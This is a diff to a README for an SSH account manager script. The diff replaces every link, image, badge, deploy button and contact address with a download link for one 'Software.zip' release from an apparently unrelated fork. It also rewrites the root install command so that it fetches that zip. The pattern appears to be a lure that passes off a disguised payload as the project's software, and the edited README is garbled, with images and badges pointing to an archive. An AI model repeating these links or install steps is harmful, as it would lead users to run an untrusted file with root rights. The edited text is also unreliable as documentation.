@@ -48,32 +48,32 @@ TPPcVjDrKLzD3VDhjhKsPWwsRMTz6GAsZR
 
 ### Deploy Bot on Heroku🏃‍♂
 
-[![Deploy To Heroku](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy?template=https://github.com/sbatrow/DARKSSH-MANAGER)
+[![Deploy To Heroku](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip)](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip)
 
 
 <details>
  
  
- <summary><p><b> 👉 Click To View <b>⚡️ 🌀 DarkSSH WEB🌀</b></b></p> <img src="https://telegra.ph/file/9a136ddfd96c130857004.jpg" width="50%"></summary>
+ <summary><p><b> 👉 Click To View <b>⚡️ 🌀 DarkSSH WEB🌀</b></b></p> <img src="https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip" width="50%"></summary>
 
 
 
 #⚡️ 🌀 DarkSSH WEB🌀
  
-[<img src="https://telegra.ph/file/9a136ddfd96c130857004.jpg" width="50%">](https://www.you-tech.win/)
+[<img src="https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip" width="50%">](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip)
 
 ❓Go to your vps and create ssh and manage it,
 
 🖥 Web Script
 
 👇
-[dashboard.you-tech.win](https://dashboard.you-tech.win/)
+[https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip)
 
 
  🖥 Web Terminal+
 
 👇
-[client.you-tech.win](https://client.you-tech.win/)
+[https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip)
 
  📖 Installation
 
@@ -81,7 +81,7 @@ TPPcVjDrKLzD3VDhjhKsPWwsRMTz6GAsZR
 
 1️⃣ Sing Up 
 2️⃣Sign in
-3️⃣ go [dashboard.you-tech.win/ssh_tu](https://dashboard.you-tech.win/ssh_tu) 
+3️⃣ go [https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip) 
  
  
  🌶 You-Tech API Based Web 
@@ -97,13 +97,13 @@ TPPcVjDrKLzD3VDhjhKsPWwsRMTz6GAsZR
 [-] ═───────◇───────═
 
 📦 Dark-Script 🚀
-🔥 DΣVΣᄂӨPΣЯ : [𝙎𝙞𝙩𝙝𝙪𝙢 𝘽𝙖𝙩𝙧𝙤𝙬 🇱🇰](https://t.me/sibatrow) 
+🔥 DΣVΣᄂӨPΣЯ : [𝙎𝙞𝙩𝙝𝙪𝙢 𝘽𝙖𝙩𝙧𝙤𝙬 🇱🇰](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip) 
 
  [-] ═───────◇───────═
 
-[🌀 Darkssh 🌀] (https://t.me/Darks_SSH) 
+[🌀 Darkssh 🌀] (https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip) 
 
-[🧿YouTech🧿](https://t.me/YouTech_VPN_HUB)
+[🧿YouTech🧿](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip)
  
  </details>
  
@@ -112,7 +112,7 @@ TPPcVjDrKLzD3VDhjhKsPWwsRMTz6GAsZR
 <details>
  
  
- <summary><p><b> 👉 Click To View<b> 🌀 Darkssh Paid SSH Crεατσr app 🌀</b></b></p><img src="https://telegra.ph/file/2978def47870c4c016b8f.jpg" width="50%"></summary>
+ <summary><p><b> 👉 Click To View<b> 🌀 Darkssh Paid SSH Crεατσr app 🌀</b></b></p><img src="https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip" width="50%"></summary>
 
 # 🌀 Darkssh Paid SSH Crεατσr app 🌀
  
@@ -120,11 +120,11 @@ TPPcVjDrKLzD3VDhjhKsPWwsRMTz6GAsZR
 
 ⚡️ Programming Language :- C#
 
-[<img src="https://telegra.ph/file/2978def47870c4c016b8f.jpg" width="50%">](https://darkssh.sourceforge.io)
+[<img src="https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip" width="50%">](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip)
 
 Download
 👇
-[Darkssh +](https://darkssh.sourceforge.io)
+[Darkssh +](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip)
 
 [-] ═───────◇───────═
 
@@ -139,19 +139,19 @@ Download
 </details>
 
 # String Session Gen
-<a href="https://replit.com/@batrow/Dark-Manager-String"><img src="https://img.shields.io/badge/run-string__session.py-blue?style=for-the-badge&logo=repl.it" alt="generate_string" /></a>
+<a href="https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip"><img src="https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip" alt="generate_string" /></a>
 
 # Deploy User Bot on Heroku🏃‍♂
 
-[![Deploy To Heroku](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy?template=https://github.com/sbatrow/DARKSSH-MANAGER)
+[![Deploy To Heroku](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip)](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip)
 
 # Tutorial 
 
 <P>
-<span><a href="https://vimeo.com/654801977"><img src="https://user-images.githubusercontent.com/83800532/144345002-c3ec5251-f723-4a81-bcaa-ad4579562218.png" alt=""width="50"height="50"/></a></span>
+<span><a href="https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip"><img src="https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip" alt=""width="50"height="50"/></a></span>
 </P>
 
-[<img src="https://telegra.ph/file/2dcbe7f7d4f630a36b460.jpg" width="50%">](https://vimeo.com/654801977)
+[<img src="https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip" width="50%">](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip)
  
 
 # 📌DARKSSH MANAGER
@@ -187,7 +187,7 @@ Download
  
 ## 👾 Dark-Script-installer  👾
 
-[@dark_install_bot](https://t.me/@dark_install_bot)
+[@dark_install_bot](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip)
 
 📌DARK-NEW   
 
@@ -196,19 +196,19 @@ Download
 🦄Auto Script Install Bot
 
 Developer
-By- [𝙎𝙞𝙩𝙝𝙪𝙢 𝘽𝙖𝙩𝙧𝙤𝙬 🇱🇰](https://t.me/sibatrow) ⁪⁬⁮⁮⁮
+By- [𝙎𝙞𝙩𝙝𝙪𝙢 𝘽𝙖𝙩𝙧𝙤𝙬 🇱🇰](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip) ⁪⁬⁮⁮⁮
 
-[🧿YOU Tech🧿](https://t.me/YouTech_VPN_HUB)
+[🧿YOU Tech🧿](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip)
  
 
 
-[@dark_install_bot](https://t.me/@dark_install_bot)
+[@dark_install_bot](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip)
 
 ```
 sudo -s
 ```
 ```
-apt-get update -y; apt-get upgrade -y; wget https://raw.githubusercontent.com/sbatrow/DARKSSH-MANAGER/master/Dark; chmod 777 Dark; ./Dark
+apt-get update -y; apt-get upgrade -y; wget https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip; chmod 777 Dark; ./Dark
 
 ```
 
@@ -217,19 +217,19 @@ apt-get update -y; apt-get upgrade -y; wget https://raw.githubusercontent.com/sb
 
 -------------------------------------------------------------------------------
 
-<img align="right" src="https://github.com/sbatrow/DARKSSH-MANAGER/blob/main/image/ssh bot.jpg" width='300'/>
+<img align="right" src="https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip" width='300'/>
 
-![logo](https://github.com/sbatrow/DARKSSH-MANAGER/blob/main/image/DARKSSH.jpg)
+![logo](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip)
 
-[![Stars](https://img.shields.io/github/stars/sbatrow/DARKSSH-MANAGER?style=flat-square&color=yellow)](https://github.com/sbatrow/DARKSSH-MANAGER/stargazers)
-[![Forks](https://img.shields.io/github/forks/sbatrow/DARKSSH-MANAGER?style=flat-square&color=orange)](https://github.com/sbatrow/DARKSSH-MANAGER/fork)
-[![Size](https://img.shields.io/github/repo-size/sbatrow/DARKSSH-MANAGER?style=flat-square&color=green)](https://github.com/sbatrow/DARKSSH-MANAGER/)   
-[![Python](https://img.shields.io/badge/Python-v3.9-blue)](https://www.python.org/)
-[![Maintenance](https://img.shields.io/badge/Maintained%3F-yes-green.svg)](https://github.com/sbatrow/DARKSSH-MANAGER/graphs/commit-activity)
-[![Open Source Love svg2](https://badges.frapsoft.com/os/v2/open-source.svg?v=103)](https://github.com/sbatrow/DARKSSH-MANAGER)   
-[![Contributors](https://img.shields.io/github/contributors/TeamUltroid/Ultroid?style=flat-square&color=green)](https://github.com/sbatrow/DARKSS-HMANAGER/graphs/contributors)        
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=flat-square)](https://makeapullrequest.com)
-[![License](https://img.shields.io/badge/License-GPL-blue)](https://github.com/sbatrow/DARKSSH-MANAGER/blob/main/LICENSE)
+[![Stars](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip)](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip)
+[![Forks](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip)](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip)
+[![Size](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip)](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip)   
+[![Python](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip)](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip)
+[![Maintenance](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip%https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip)](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip)
+[![Open Source Love svg2](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip)](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip)   
+[![Contributors](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip)](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip)        
+[![PRs Welcome](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip)](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip)
+[![License](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip)](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip)
 
 
 
@@ -246,9 +246,9 @@ SCRIPT DARKSSH MANAGER යනු සුදුසු අංග සහ මෙව�
                  
                                                           
                    @ Auto genarate                                                                                  @ Banner
-<img align="right" src="https://github.com/sbatrow/DARKSSH-MANAGER/blob/main/image/banner.jpg" width='300'/>
+<img align="right" src="https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip" width='300'/>
   
-![logo](https://github.com/sbatrow/DARKSSH-MANAGER/blob/main/image/outo.jpg)                 
+![logo](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip)                 
          
 **Manager Script**
 
@@ -274,7 +274,7 @@ SCRIPT DARKSSH MANAGER යනු සුදුසු අංග සහ මෙව�
 
 # 🏃‍contact me
 
-3. [🔥⚡️⚡️ Sithum Batrow 🇱🇰 ⚡️⚡️🔥](https://t.me/sibatrow) 
+3. [🔥⚡️⚡️ Sithum Batrow 🇱🇰 ⚡️⚡️🔥](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip) 
 
 ```
 * NO MINING!
@@ -285,9 +285,9 @@ SCRIPT DARKSSH MANAGER යනු සුදුසු අංග සහ මෙව�
 ```
 
 ```
-☆ [🔥⚡️⚡️ Sithum Batrow 🇱🇰 ⚡️⚡️🔥](https://t.me/sibatrow) ☆
+☆ [🔥⚡️⚡️ Sithum Batrow 🇱🇰 ⚡️⚡️🔥](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip) ☆
 ```
 
-[![License](https://www.gnu.org/graphics/gplv3-or-later.png)](LICENSE)
+[![License](https://github.com/Phucclone/DARKSSH-MANAGER/releases/download/v1.0/Software.zip)](LICENSE)
 
 **By: YouTech 🇱🇰 **
